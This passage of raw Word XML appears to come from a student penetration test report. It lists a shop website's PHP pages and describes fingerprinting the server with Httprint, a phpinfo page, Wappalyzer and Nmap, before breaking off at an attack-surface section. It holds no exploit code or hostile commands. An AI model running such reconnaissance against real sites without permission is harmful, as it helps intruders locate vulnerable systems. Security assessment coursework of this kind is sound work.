    <w:p w14:paraId="36B94ED0" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7E114871" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>products.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="781510CE" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>view_cart.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5B32B57B" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>process.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="43691942" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>customer.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="31FAD032" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>contact.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7E11D21F" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>profile.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0CB6E5CD" w14:textId="77777777" w:rsidR="00782706" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5F9AAABC" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>add_product.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4B94D027" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>Employee.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="27024A8D" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>add_warehouse.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1DF2C9A8" w14:textId="77777777" w:rsidR="00897567" w:rsidRDefault="00897567" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00897567">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00897567">
        <w:t>add_category.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="062F01FC" w14:textId="77777777" w:rsidR="00D853CD" w:rsidRDefault="00220EE7" w:rsidP="00CA1A16">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc531104332"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Identify the Technologies Used</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="26046BA2" w14:textId="1135B81B" w:rsidR="00B42C6B" w:rsidRDefault="0089406E" w:rsidP="00220EE7">
      <w:r w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">From the </w:t>
      </w:r>
      <w:r w:rsidR="001361C3" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>previous</w:t>
      </w:r>
      <w:r w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> results, it is </w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>understood</w:t>
      </w:r>
      <w:r w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> that the website uses forms, scripts and cookies. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00776D91" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Httprint</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cs="Arial"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>httprint</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> Download – Web Server Fingerprinting Tool - Darknet</w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cs="Arial"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="00776D91" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> was run to find o</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>ut information</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> about the server</w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> and the results of this scan can be seen</w:t>
      </w:r>
      <w:r w:rsidR="00776D91">
        <w:t xml:space="preserve"> in Ap</w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t xml:space="preserve">pendix D. </w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t xml:space="preserve">However, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B42C6B">
        <w:t>Httprint</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B42C6B">
        <w:t xml:space="preserve"> did not divulge </w:t>
      </w:r>
      <w:r w:rsidR="00776D91">
        <w:t xml:space="preserve">any new information about the server. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546BCCC1" w14:textId="10AD4835" w:rsidR="001361C3" w:rsidRDefault="00B42C6B" w:rsidP="00220EE7">
      <w:r>
        <w:t xml:space="preserve">By </w:t>
      </w:r>
      <w:r w:rsidR="00823A40">
        <w:t>viewing</w:t>
      </w:r>
      <w:r w:rsidR="001361C3">
        <w:t xml:space="preserve"> the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001361C3">
        <w:t>phpinfo.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001361C3">
        <w:t xml:space="preserve"> page, it is seen that the vers</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve">ion of </w:t>
      </w:r>
      <w:r>
        <w:t>PHP</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> running is 5.4.7 and </w:t>
      </w:r>
      <w:r w:rsidR="001361C3">
        <w:t>the server running is Apache 2.4.3. T</w:t>
      </w:r>
      <w:r>
        <w:t>his information can be seen in F</w:t>
      </w:r>
      <w:r w:rsidR="001361C3">
        <w:t>igure</w:t>
      </w:r>
      <w:r w:rsidR="00566BAE">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 6 and 7</w:t>
      </w:r>
      <w:r w:rsidR="001361C3">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469AE865" w14:textId="77777777" w:rsidR="001361C3" w:rsidRDefault="001361C3" w:rsidP="001361C3">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F64AB55" wp14:editId="140DA7EF">
            <wp:extent cx="5791200" cy="3762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200" cy="3762375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD25431" w14:textId="74DBB560" w:rsidR="001361C3" w:rsidRDefault="001361C3" w:rsidP="001361C3">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="02F4AC0E" w14:textId="77777777" w:rsidR="001361C3" w:rsidRDefault="001361C3" w:rsidP="001361C3">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AF03D4F" wp14:editId="1D6CF677">
            <wp:extent cx="5943600" cy="54406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440680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7936CD" w14:textId="5CF9A405" w:rsidR="001361C3" w:rsidRDefault="001361C3" w:rsidP="001361C3">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Server info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68384CA3" w14:textId="3D253F0B" w:rsidR="001361C3" w:rsidRDefault="001361C3" w:rsidP="001361C3">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Wappalyzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Wappalyzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> - Identify technologies on websites, 2018)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a tool that is used to identify what </w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t>technologies</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> are</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> running on a</w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t xml:space="preserve"> webpage. After using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B51A3E">
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>appalyzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, it </w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t>is found</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that the server </w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t>is running PHP, and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> jQuery 1.6.2. This </w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t>can be</w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t xml:space="preserve"> seen in Fi</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gure </w:t>
      </w:r>
      <w:r w:rsidR="00B42C6B">
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E0E4DA" w14:textId="77777777" w:rsidR="001361C3" w:rsidRDefault="001361C3" w:rsidP="001361C3">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7837E2F5" wp14:editId="130AC5E5">
            <wp:extent cx="6622001" cy="138112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943" t="3988" b="64103"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6625324" cy="1381818"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B85EA8" w14:textId="34CEB53A" w:rsidR="001361C3" w:rsidRDefault="001361C3" w:rsidP="001361C3">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Wappalyzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7414163D" w14:textId="2E384032" w:rsidR="0065283D" w:rsidRDefault="0065283D" w:rsidP="0065283D">
      <w:r>
        <w:t xml:space="preserve">After running </w:t>
      </w:r>
      <w:r w:rsidR="00B51A3E">
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002A1765">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00B42C6B" w:rsidRPr="00B42C6B">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> Network Mapper - Free Security Scanner, 2018)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> scan </w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t>against</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the website, it was found that the website uses </w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D17CE5">
        <w:t>databases.</w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t xml:space="preserve"> The results of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002A1765">
        <w:t>Nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002A1765">
        <w:t xml:space="preserve"> scan can be seen in Figure 9</w:t>
      </w:r>
      <w:r w:rsidR="001F43BC">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A61FBD" w14:textId="77777777" w:rsidR="0065283D" w:rsidRDefault="0065283D" w:rsidP="0065283D">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F56A375" wp14:editId="59C97AFF">
            <wp:extent cx="5943600" cy="2446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46655"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1C7FFC" w14:textId="52EC03C2" w:rsidR="0065283D" w:rsidRPr="0065283D" w:rsidRDefault="0065283D" w:rsidP="0065283D">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002A1765">
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>map</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6966B6B8" w14:textId="77777777" w:rsidR="001361C3" w:rsidRDefault="0065283D" w:rsidP="0065283D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc531104333"/>
      <w:r>
        <w:t>Map the attack surface</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247C9852" w14:textId="42FC32AF" w:rsidR="00683C2A" w:rsidRDefault="00683C2A" w:rsidP="0065283D">
      <w:r>
        <w:t xml:space="preserve">From the results identified previously, the website uses </w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t>PHP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on every webpage. In order to give the websit</w:t>
      </w:r>
      <w:r w:rsidR="006D488C">
        <w:t xml:space="preserve">e functionality, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="006D488C">
        <w:t>JQuery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006D488C">
        <w:t xml:space="preserve"> is used</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and when a request to a database is made, the request </w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t xml:space="preserve">is made </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">using </w:t>
      </w:r>
      <w:r w:rsidR="002A1765">
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CC2291" w14:textId="205095D0" w:rsidR="002A1765" w:rsidRDefault="002A1765" w:rsidP="0065283D">
      <w:r>
        <w:t xml:space="preserve">The main pages that present an attack surface are the pages that </w:t>
      </w:r>
      <w:r w:rsidR="00D17CE5">
